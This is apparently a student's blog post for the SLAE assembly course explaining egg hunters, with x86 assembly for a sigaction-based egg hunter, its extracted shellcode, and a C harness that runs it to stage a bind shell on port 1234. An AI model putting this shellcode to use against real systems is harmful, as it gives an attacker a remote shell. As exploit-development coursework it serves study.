---
title: "SLAE Assignment 3"
date: 2018-02-07
published: true
---

### SecurityTube Linux Assembly Expert (SLAE) Course Exercises

[GitHub code repo](https://github.com/wsummerhill/SLAE)

This assignment requires us to look into the concept of “egg hunters” when it comes to buffer overflows and reverse engineering. 

Egg hunting is used in buffer overflows when there is a limited buffer space for executing shellcode at the end of the buffer which would normally prevent the use of a payload. The egg hunter is used to search through the entire range of memory in the heap or stack for our shellcode and redirect execution to it.

There is a well known paper on egg hunting by Skape which can be found here 

The egg is going to be 8 bytes in size - 4 byte egg repeated twice - converted to hex. 

When the program finds the tag it will redirect execution to where our shellcode is in memory.

The Sigaction system call allows multiple addresses to be validated at a single time by taking advantage of the kernel’s verify_area routine which is used, for instance, on structures that have been passed in from user-mod eto a system call.

It will be used to allow for validating of user-mode addresses and has the following format:
```bash
int sigaction(int signum, const struct sigaction *act, struct
sigaction *oldact)
```
Where
- gnum = EBX
- t = ECX
- dact = EDX

The system call for sigaction is 67 decimal (0x43 hex) which we’ll use in EAX.
Now onto the egg hunter code in Assembly.


```cpp
;Author: Will Summerhill
;Egg hunter code 
global _start

section .text
_start:

entry:
  or cx, 0xfff

next:
  inc ecx              ;page counter
  push byte +0x43      ;sigaction system call
  pop eax              ;store sigaction syscall into EAX
  int 0x80             ;execute sigaction
  cmp al, 0xf2         ;check if there was a segFault (if AL = 0xf2)
  jz entry             ;jump if zero flag (ZF) set from above cmp
  mov eax, 0x99999999  ;store egg into EAX
  mov edi, ecx         ;move into EDI to validate address

  ;EAX is egg, EDI is next address to validate
  scasd                ;scan string by comparing EAX and EDI, increment EDI by 4 
  jnz next             ;jump if zero flag (ZF) is not set from above compare
  
  scasd                ;will execute when first bytes of egg matched, compare the second half
  jnz next             ;match failed - try again from next address
  jmp edi              ;egg found - jump to payload in EDI
```

We can test this by determining the shellcode of the above program with the command objdump -d A3 -M intel and then copying it into our C program for execution with the normal //bin/sh bind shellcode. 

```cpp
#include<stdio.h>
#include<string.h>


//extracted egg hunter shellcode
unsigned char egghunter[] = \
"\x66\x81\xc9\xff\x0f"         //or     cx,0xfff
"\x41"                     //inc    ecx
"\x6a\x43"                  //push   0x43
"\x58"                     //pop    eax
"\xcd\x80"                  //int    0x80
"\x3c\xf2"                  //cmp    al,0xf2
"\x74\xf1"                  //je     80480a0 <_start>
"\xb8\x99\x99\x99\x99"          //mov    eax,0x99999999 --> EGG
"\x89\xcf"                  //mov    edi,ecx
"\xaf"                     //scas   eax,DWORD PTR es:[edi]
"\x75\xec"                  //jne    80480a5 <next>
"\xaf"                     //scas   eax,DWORD PTR es:[edi]
"\x75\xe9"                  //jne    80480a5 <next>
"\xff\xe7";       //jmp    edi


//add egg twice to beginning of bind shellcode below
//listens on localhost port 1234

unsigned char code[] = \
"\x99\x99\x99\x99\x99\x99\x99\x99\x31\xc0\xb0\x02\x31\xdb\xb3\x01\x31\xd2\x52\x53\x50\x31\xc9\x89\xe1\x31\xc0\xb0\x66\xcd\x80\x89\xc2\x31\xdb\x53\x66\x68\x04\xd2\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x31\xc0\xb0\x66\xb3\x02\x89\xe1\xcd\x80\x6a\x01\x52\x31\xc0\x31\xdb\xb0\x66\xb3\x04\x89\xe1\xcd\x80\x31\xc0\x31\xdb\x50\x50\x52\x89\xe1\xb0\x66\xb3\x05\xcd\x80\x89\xc2\x31\xc0\xb0\x3f\x89\xd3\x31\xc9\xcd\x80\x31\xc0\xb0\x3f\x89\xd3\x41\xcd\x80\x31\xc0\xb0\x3f\x89\xd3\x41\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80";

main()
{
  printf("Shellcode Length with 8 byte egg:  %d\n", strlen(code));
  printf("Egg hunter length: %d bytes\n", strlen(egghunter));
  int (*ret)() = (int(*)())egghunter; //return egghunter
  ret();
}
```

Now compiling the shellcode and executing we get a bind shell listening on port 1234 while using the egg hunter as the first staged payload which will redirect program execution to the normal bind shell that is prepended with the egg.  

![EmbeddedImage](https://user-images.githubusercontent.com/35749735/206793505-b8a2f3ef-eb5b-4de8-b413-5185b76870c2.png)

![EmbeddedImage1](https://user-images.githubusercontent.com/35749735/206793522-3e98469d-90c3-4006-896d-7c0872b5266d.png)

----------

The assembly code can also be found here on my [Github](https://github.com/wsummerhill/SLAE/blob/master/Assignment%201).

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert

Student ID: SLAE-1109
